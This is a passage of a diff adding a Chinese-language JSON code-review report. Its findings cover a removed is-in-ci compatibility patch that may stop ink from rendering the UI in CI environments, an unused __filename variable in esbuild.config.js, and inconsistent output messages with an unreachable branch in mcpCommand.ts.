+      "description": "被删除的 packages/cli/src/patches/is-in-ci.ts 明确说明其存在目的是规避「ink 检测到 CI 环境后不渲染 UI」的问题（引用 issue #1563），并通过 esbuild alias 生效；本次同时删除补丁文件与 esbuild 的 external/alias 配置。若依赖的 ink 版本仍带同样的 CI 检测逻辑，在设置了 CI 类环境变量的终端中运行时交互界面会不再渲染。这是一处需要在 MR 中说明原因（如 ink 升级已修复）的行为改动。",
+      "evidence": [
+        "被删除的 packages/cli/src/patches/is-in-ci.ts 注释：This is a replacement for the `is-in-ci` package that always returns false. We are doing this to avoid the issue where `ink` does not render the UI when it detects that it is running in a CI environment. ... See issue #1563",
+        "被删除的 esbuild.config.js 配置：external: [] 与 alias: { 'is-in-ci': path.resolve(__dirname, 'packages/cli/src/patches/is-in-ci.ts') }",
+        "esbuild.config.js:17-26 现只剩 entryPoints/bundle/outfile/platform/format/define，无 alias 覆盖"
+      ],
+      "rule": "COMPAT-INK-016",
+      "confidence": 0.5,
+      "tips": {
+        "review": "[缺陷类型] 移除既有兼容性补丁而未见说明。影响评估：在 CI=true 等环境下可能出现 UI 不渲染的回归（issue #1563 的症状），且构建产物不再将 is-in-ci 打到指定实现。",
+        "suggestion": "[重构思路] 若依赖版本已修复该问题，请在 MR 描述中给出验证（ink / is-in-ci 版本与验证方式）；否则保留补丁或在代码层显式忽略 CI 检测。代码示例：`// esbuild.config.js\nalias: { 'is-in-ci': path.resolve(__dirname, 'packages/cli/src/patches/is-in-ci.ts') }`",
+        "subcategory": "构建与运行环境兼容"
+      }
+    },
+    {
+      "id": "F017",
+      "severity": "P3",
+      "category": "可读性",
+      "file": "esbuild.config.js",
+      "line": 12,
+      "title": "移除 alias 后 __filename 成为未使用的残留变量",
+      "description": "alias 删除后，esbuild.config.js 中 `const __filename = fileURLToPath(import.meta.url);` 已无任何使用点（__dirname 仍被 package.json 读取所用），会触发 lint 的 no-unused-vars 或给人误导。",
+      "evidence": [
+        "esbuild.config.js:12-13 — const __filename = fileURLToPath(import.meta.url); const __dirname = path.dirname(__filename);",
+        "esbuild.config.js:15 — 只剩 pkg = require(path.resolve(__dirname, 'package.json')) 使用 __dirname，全文件无 __filename 的其它引用"
+      ],
+      "rule": "STYLE-UNUSED-017",
+      "confidence": 0.8,
+      "tips": {
+        "review": "[缺陷类型] 未使用变量残留。影响评估：lint 告警与阅读噪音，属清理项。",
+        "suggestion": "[重构思路] 删除 __filename，或直接用 `const __dirname = path.dirname(fileURLToPath(import.meta.url));`。代码示例：`const __dirname = path.dirname(fileURLToPath(import.meta.url));`",
+        "subcategory": "死代码清理"
+      }
+    },
+    {
+      "id": "F018",
+      "severity": "P3",
+      "category": "可读性",
+      "file": "packages/cli/src/ui/commands/mcpCommand.ts",
+      "line": 181,
+      "title": "prompt/tool 计数的兜底文案与后续“无工具”分支语义重复且不一致",
+      "description": "CONNECTED 分支在没有任何 tool/prompt 时回退输出 `(0 tools)`，而下方第 270-273 行又会输出 `No tools or prompts available` / `No tools available`，同一状态出现两处措辞；同时第 255-263 行 `const descLines = prompt.description.trim().split('\\n'); if (descLines) {...} else {...}` 的 else 分支永远不可达（split 恒返回数组），属于无效分支。整体增加了输出文案的不一致与死代码。",
+      "evidence": [
+        "packages/cli/src/ui/commands/mcpCommand.ts:179-183 — if (parts.length > 0) { message += ` (${parts.join(', ')})`; } else { message += ` (0 tools)`; }",
+        "packages/cli/src/ui/commands/mcpCommand.ts:270-277 — if (serverTools.length === 0 && serverPrompts.length === 0) { message += '  No tools or prompts available' } else if (serverTools.length === 0) { message += '  No tools available' ... }",
+        "packages/cli/src/ui/commands/mcpCommand.ts:255-263 — const descLines = prompt.description.trim().split('\\n'); if (descLines) { ... } else { message += '\\n'; }（else 不可达）"
+      ],
+      "rule": "STYLE-MESSAGE-018",
+      "confidence": 0.6,
+      "tips": {
+        "review": "[缺陷类型] 文案冗余与不可达分支。影响评估：/mcp 输出对同一状态给出两种描述，易误读；死分支增加维护负担。",
+        "suggestion": "[重构思路] 计数兜底只保留一处语义（例如无工具也无 prompt 时不追加括号信息，由正文统一说明），并去掉恒真的 if (descLines) 判断。代码示例：`const descLines = prompt.description.trim().split('\\n'); message += ':\\n'; for (const line of descLines) { message += `      ${COLOR_GREEN}${line}${RESET_COLOR}\\n`; }`",
+        "subcategory": "输出文案与死分支"
+      }
+    }
+  ]
+}
